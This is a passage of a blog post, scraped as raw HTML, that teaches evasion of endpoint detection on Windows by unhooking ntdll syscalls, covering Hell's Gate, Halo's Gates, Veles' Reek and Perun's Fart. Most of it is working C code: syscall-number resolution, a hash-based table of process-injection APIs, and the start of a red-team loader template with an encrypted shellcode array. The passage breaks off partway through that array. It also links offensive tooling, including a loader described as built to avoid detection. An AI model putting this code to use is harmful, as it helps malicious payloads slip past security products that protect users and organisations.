2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*8I02SWEiggT65s3-rgjy_w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*8I02SWEiggT65s3-rgjy_w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*8I02SWEiggT65s3-rgjy_w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*8I02SWEiggT65s3-rgjy_w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*8I02SWEiggT65s3-rgjy_w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*8I02SWEiggT65s3-rgjy_w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*8I02SWEiggT65s3-rgjy_w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb qa c" width="700" height="397" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*8I02SWEiggT65s3-rgjy_w.png"></picture></div></div></figure><p id="6718" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The rays that i have been put it is the same thing in the code i mentioned :</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="ba65" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph=""><span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0x4c</span>     <br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + cw) == <span class="hljs-number">0x8b</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + cw) == <span class="hljs-number">0xd1</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + cw) == <span class="hljs-number">0xb8</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + cw) == <span class="hljs-number">0x00</span></span></pre><p id="7d01" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The first is 4C, 8B, D1 and so on, this means that the function is hooked and then we try to unhook it while we stop to the “syscall” instruction in the image.</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="c931" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph="">INT <span class="hljs-title.function">wmain</span><span class="hljs-params">()</span> {<br><span class="hljs-comment">//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {</span><br><br> PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();<br> PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;<br> <span class="hljs-keyword">if</span> (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != <span class="hljs-number">0xA</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>;<br><br> <span class="hljs-comment">// Get NTDLL module </span><br> PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="hljs-number">0x10</span>);<br><br> <span class="hljs-comment">// Get the EAT of NTDLL</span><br> PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = <span class="hljs-literal">NULL</span>;<br> <span class="hljs-keyword">if</span> (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x01</span>;<br><br> VX_TABLE Table = { <span class="hljs-number">0</span> };<br> <br> <span class="hljs-comment">//__debugbreak();</span><br> <br> Table.NtAllocateVirtualMemory.dwHash = <span class="hljs-number">0xf5bd373480a6b89b</span>;<br> <span class="hljs-keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>;<br><br> Table.NtCreateThreadEx.dwHash = <span class="hljs-number">0x64dc7db288c5015f</span>;<br> <span class="hljs-keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>;<br><br> Table.NtProtectVirtualMemory.dwHash = <span class="hljs-number">0x858bcb1046fb6a37</span>;<br> <span class="hljs-keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>;<br><br> Table.NtWaitForSingleObject.dwHash = <span class="hljs-number">0xc6a2fa174e551bcb</span>;<br> <span class="hljs-keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span>;<br><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"VX_Table = %p\n"</span>, Table); getchar();<br> <br> Payload(&amp;Table);<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0x00</span>;<br>}</span></pre><p id="9c36" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Here it will do the opration 4 time for each API and we will know it easly from the instructions i know it will be complex but really it’s easy</p><p id="fe90" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">This is the full source code of this technique : <a class="ah ov" href="https://github.com/trickster0/TartarusGate/blob/master/HellsGate/main.c" rel="noopener ugc nofollow" target="_blank">TartarusGate/main.c at master · trickster0/TartarusGate · GitHub</a></p></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="e24b" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The third unhooking technique is called “Halo’s Gates.” It is an enhancement of Hells Gate that enables it to work with ntdll by dynamically resolving system call numbers. Unlike Hells Gate, where we have to specify the number, Halo’s Gates automates this process. To grasp this concept fully, it would be beneficial to examine it practically within a debugger.</p><p id="eb27" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Upon inspecting the code, we can observe some straightforward modifications compared to Hells Gate.</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="6fee" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph="">   <span class="hljs-comment">// if hooked check the neighborhood to find clean syscall</span><br>   <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress) == <span class="hljs-number">0xe9</span>) {<br><br>    <span class="hljs-keyword">for</span> (WORD idx = <span class="hljs-number">1</span>; idx &lt;= <span class="hljs-number">500</span>; idx++) {<br>     <span class="hljs-comment">// check neighboring syscall down</span><br>     <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + idx * DOWN) == <span class="hljs-number">0x4c</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + idx * DOWN) == <span class="hljs-number">0x8b</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + idx * DOWN) == <span class="hljs-number">0xd1</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + idx * DOWN) == <span class="hljs-number">0xb8</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + idx * DOWN) == <span class="hljs-number">0x00</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">7</span> + idx * DOWN) == <span class="hljs-number">0x00</span>) {<br>      BYTE high = *((PBYTE)pFunctionAddress + <span class="hljs-number">5</span> + idx * DOWN);<br>      BYTE low = *((PBYTE)pFunctionAddress + <span class="hljs-number">4</span> + idx * DOWN);<br>      pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; <span class="hljs-number">8</span>) | low - idx;<br>      <br>      <span class="hljs-keyword">return</span> TRUE;<br>     }<br>     <span class="hljs-comment">// check neighboring syscall up</span><br>     <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + idx * UP) == <span class="hljs-number">0x4c</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + idx * UP) == <span class="hljs-number">0x8b</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + idx * UP) == <span class="hljs-number">0xd1</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + idx * UP) == <span class="hljs-number">0xb8</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + idx * UP) == <span class="hljs-number">0x00</span><br>      &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">7</span> + idx * UP) == <span class="hljs-number">0x00</span>) {<br>      BYTE high = *((PBYTE)pFunctionAddress + <span class="hljs-number">5</span> + idx * UP);<br>      BYTE low = *((PBYTE)pFunctionAddress + <span class="hljs-number">4</span> + idx * UP);<br>      pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; <span class="hljs-number">8</span>) | low + idx;<br>      <br>      <span class="hljs-keyword">return</span> TRUE;<br>     }<br><br>    }</span></pre><p id="4ad6" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">If you looking for the diffrent the 0xe9 that the thing we will look at it, now look at the debugger when i’m told you to go you will find jmp instruction in zwCreateThread and beside it you will find the 0xe9, In the code we make for loop that we after function function we add 1 as you see in the code then if we find 1 we take it’s syscall number we -it from the idx</p><p id="4316" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">github source code : <a class="ah ov" href="https://github.com/raulm0429/HalosGate-Cpl-C-" rel="noopener ugc nofollow" target="_blank">raulm0429/HalosGate-Cpl-C-: Halos Gate implementation in C++ (github.com)</a></p></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="6dca" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The fourth unhooking technique is known as “Veles’ Reek.” While there is no specific proof of concept (PoC) available, Abdallah Mohammed has implemented this technique. Reevel’s Reeks builds upon the concepts of both Halo’s Gates and Hell’s Gate.</p><p id="8254" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">What makes this technique particularly interesting is that if all the functions, including the ones implemented in Halo’s Gates and Hell’s Gate, when the all functions are hooked that’s impossible that the function will be unhooked so in the tool it will add 1 from the first function. This approach is quite remarkable, as it starts from the first function and progressively continues until it finds the hooked function.</p><p id="2f1c" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">For further information and implementation details, you can refer to Abdullah Elsharif’s repository on GitHub: 0xNinjaCyclone<a class="ah ov" href="https://github.com/abdallah-elsharif/PowerLoad3r" rel="noopener ugc nofollow" target="_blank">/PowerLoad3r: Malicious PowerShell Scripts Loader Designed to Avoid Detection</a>.</p></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="bed7" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The final technique I’d like to discuss is called “Pernus Fart.” This technique is quite intriguing, although it’s worth noting that modern Endpoint Detection and Response (EDR) systems can potentially detect it. The approach involves creating a new process in suspended mode, followed by parsing the ntdll to determine its size. Then, a new memory is created to accommodate the clean ntdll. Subsequently, the process is deleted since it is no longer needed.</p><p id="0344" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">With the clean ntdll in hand, the next step is to remove the hooks. This is achieved by identifying the “.text” section and modifying its protection to allow for copying the clean syscall table into the ntdll memory. To locate the hooked syscall, a creative method is employed: by identifying the beginning and ending bytes of the syscall, a match can be determined, indicating whether it has been hooked or not.</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="7237" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph=""><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FindFirstSyscall</span><span class="hljs-params">(<span class="hljs-type">char</span> * pMem, DWORD size)</span></span>{<br> <br> <span class="hljs-comment">// gets the first byte of first syscall</span><br> DWORD i = <span class="hljs-number">0</span>;<br> DWORD offset = <span class="hljs-number">0</span>;<br> BYTE pattern1[] = <span class="hljs-string">"\x0f\x05\xc3"</span>;  <span class="hljs-comment">// syscall ; ret</span><br> BYTE pattern2[] = <span class="hljs-string">"\xcc\xcc\xcc"</span>;  <span class="hljs-comment">// int3 * 3</span><br> <br> <span class="hljs-comment">// find first occurance of syscall+ret instructions</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size - <span class="hljs-number">3</span>; i++) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + i, pattern1, <span class="hljs-number">3</span>)) {<br>   offset = i;<br>   <span class="hljs-keyword">break</span>;<br>  }<br> }  <br> <br> <span class="hljs-comment">// now find the beginning of the syscall</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">50</span> ; i++) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + offset - i, pattern2, <span class="hljs-number">3</span>)) {<br>   offset = offset - i + <span class="hljs-number">3</span>;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"First syscall found at 0x%p\n"</span>, pMem + offset);<br>   <span class="hljs-keyword">break</span>;<br>  }  <br> }<br><br> <span class="hljs-keyword">return</span> offset;<br>}<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FindLastSysCall</span><span class="hljs-params">(<span class="hljs-type">char</span> * pMem, DWORD size)</span> </span>{<br><br> <span class="hljs-comment">// returns the last byte of the last syscall</span><br> DWORD i;<br> DWORD offset = <span class="hljs-number">0</span>;<br> BYTE pattern[] = <span class="hljs-string">"\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc"</span>;  <span class="hljs-comment">// syscall ; ret ; int 2e ; ret ; int3 * 3</span><br> <br> <span class="hljs-comment">// backwards lookup</span><br> <span class="hljs-keyword">for</span> (i = size - <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) {<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(pMem + i, pattern, <span class="hljs-number">9</span>)) {<br>   offset = i + <span class="hljs-number">6</span>;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Last syscall byte found at 0x%p\n"</span>, pMem + offset);<br>   <span class="hljs-keyword">break</span>;<br>  }<br> }  <br> <br> <span class="hljs-keyword">return</span> offset;<br>}</span></pre><p id="fa40" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">There are easier way of this in my tool : <a class="ah ov" href="https://github.com/0xHossam/Killer" rel="noopener ugc nofollow" target="_blank">https://github.com/0xHossam/Killer</a></p><p id="3b89" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">And here is the implementation by sektor7 ^_^</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="7a96" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph=""><span class="hljs-comment">/*<br><br> Red Team Operator course code template<br> Perun's Fart - unhooking ntdll w/o reading disk<br> <br> author: reenz0h (twitter: @SEKTOR7net)<br><br>*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wincrypt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (lib, <span class="hljs-string">"crypt32.lib"</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (lib, <span class="hljs-string">"advapi32"</span>)</span><br><br><span class="hljs-comment">// MessageBox shellcode - 64-bit</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = { <span class="hljs-number">0x23</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xb6</span>, <span 